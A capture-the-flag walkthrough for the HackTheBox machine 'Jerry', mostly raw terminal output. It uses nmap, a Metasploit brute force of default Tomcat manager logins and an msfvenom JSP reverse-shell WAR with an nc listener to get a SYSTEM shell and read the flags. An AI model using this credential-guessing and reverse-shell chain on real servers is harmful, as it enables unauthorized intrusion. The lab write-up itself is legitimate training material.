---
title: "HackTheBox - Jerry"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

Jerry wie ein kleiner Teil von Kotarak!

root@kali:~# nmap 10.10.10.95 -sV -sC  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-19 14:02 CET  
Nmap scan report for 10.10.10.95  
Host is up (0.028s latency).  
Not shown: 999 filtered ports  
PORT STATE SERVICE VERSION  
8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1  
|_http-favicon: Apache Tomcat  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-server-header: Apache-Coyote/1.1  
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds

root@kali:~# msfconsole

msf > search tomcat

Matching Modules  
================

Name Disclosure Date Rank Check Description  
---- --------------- ---- ----- -----------  
auxiliary/admin/http/tomcat_administration normal Yes Tomcat Administration Tool Default Access  
auxiliary/admin/http/tomcat_utf8_traversal 2009-01-09 normal Yes Tomcat UTF-8 Directory Traversal Vulnerability  
auxiliary/admin/http/trendmicro_dlp_traversal 2009-01-09 normal Yes TrendMicro Data Loss Prevention 5.5 Directory Traversal  
auxiliary/dos/http/apache_commons_fileupload_dos 2014-02-06 normal No Apache Commons FileUpload and Apache Tomcat DoS  
auxiliary/dos/http/apache_tomcat_transfer_encoding 2010-07-09 normal No Apache Tomcat Transfer-Encoding Information Disclosure and DoS  
auxiliary/dos/http/hashcollision_dos 2011-12-28 normal No Hashtable Collisions  
auxiliary/scanner/http/tomcat_enum normal Yes Apache Tomcat User Enumeration  
auxiliary/scanner/http/tomcat_mgr_login normal Yes Tomcat Application Manager Login Utility  
exploit/linux/http/cisco_prime_inf_rce 2018-10-04 excellent Yes Cisco Prime Infrastructure Unauthenticated Remote Code Execution  
exploit/multi/http/struts2_namespace_ognl 2018-08-22 excellent Yes Apache Struts 2 Namespace Redirect OGNL Injection  
exploit/multi/http/struts_code_exec_classloader 2014-03-06 manual No Apache Struts ClassLoader Manipulation Remote Code Execution  
exploit/multi/http/struts_dev_mode 2012-01-06 excellent Yes Apache Struts 2 Developer Mode OGNL Execution  
exploit/multi/http/tomcat_jsp_upload_bypass 2017-10-03 excellent Yes Tomcat RCE via JSP Upload Bypass  
exploit/multi/http/tomcat_mgr_deploy 2009-11-09 excellent Yes Apache Tomcat Manager Application Deployer Authenticated Code Execution  
exploit/multi/http/tomcat_mgr_upload 2009-11-09 excellent Yes Apache Tomcat Manager Authenticated Upload Code Execution  
exploit/multi/http/zenworks_configuration_management_upload 2015-04-07 excellent Yes Novell ZENworks Configuration Management Arbitrary File Upload  
post/multi/gather/tomcat_gather normal No Gather Tomcat Credentials  
post/windows/gather/enum_tomcat normal No Windows Gather Apache Tomcat Enumeration

msf > use auxiliary/scanner/http/tomcat_mgr_login  
msf auxiliary(scanner/http/tomcat_mgr_login) > options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

Name Current Setting Required Description  
---- --------------- -------- -----------  
BLANK_PASSWORDS false no Try blank passwords for all users  
BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5  
DB_ALL_CREDS false no Try each user/password couple stored in the current database  
DB_ALL_PASS false no Add all passwords in the current database to the list  
DB_ALL_USERS false no Add all users in the current database to the list  
PASSWORD no The HTTP password to specify for authentication  
PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt no File containing passwords, one per line  
Proxies no A proxy chain of format type:host:port[,type:host:port][...]  
RHOSTS yes The target address range or CIDR identifier  
RPORT 8080 yes The target port (TCP)  
SSL false no Negotiate SSL/TLS for outgoing connections  
STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host  
TARGETURI /manager/html yes URI for Manager login. Default is /manager/html  
THREADS 1 yes The number of concurrent threads  
USERNAME no The HTTP username to specify for authentication  
USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt no File containing users and passwords separated by space, one pair per line  
USER_AS_PASS false no Try the username as the password for all users  
USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt no File containing users, one per line  
VERBOSE true yes Whether to print output for all attempts  
VHOST no HTTP server virtual host

msf auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.10.10.95  
rhosts => 10.10.10.95  
msf auxiliary(scanner/http/tomcat_mgr_login) > exploit

-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)  
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:root (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:tomcat (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:s3cret (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: both:vagrant (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)  
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed

root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.5 LPORT=4444 -f war > m10x.war  
Payload size: 1089 bytes  
Final size of war file: 1089 bytes

root@kali:~# nc -lnvp 4444  
listening on [any] 4444 ...  
connect to [10.10.15.5] from (UNKNOWN) [10.10.10.95] 49713  
Microsoft Windows [Version 6.3.9600]  
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami  
whoami  
nt authority\system

C:\apache-tomcat-7.0.88>cd C:/Users/Administrator/Desktop  
cd C:/Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is FC2B-E489

Directory of C:\Users\Administrator\Desktop

06/19/2018 06:09 AM <DIR> .  
06/19/2018 06:09 AM <DIR> ..  
06/19/2018 06:09 AM <DIR> flags  
0 File(s) 0 bytes  
3 Dir(s) 27,595,964,416 bytes free

C:\Users\Administrator\Desktop>cd flags  
cd flags

C:\Users\Administrator\Desktop\flags>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is FC2B-E489

Directory of C:\Users\Administrator\Desktop\flags

06/19/2018 06:09 AM <DIR> .  
06/19/2018 06:09 AM <DIR> ..  
06/19/2018 06:11 AM 88 2 for the price of 1.txt  
1 File(s) 88 bytes  
2 Dir(s) 27,595,964,416 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"  
type "2 for the price of 1.txt"  
user.txt  
700##########################d00

root.txt  
04a##########################90e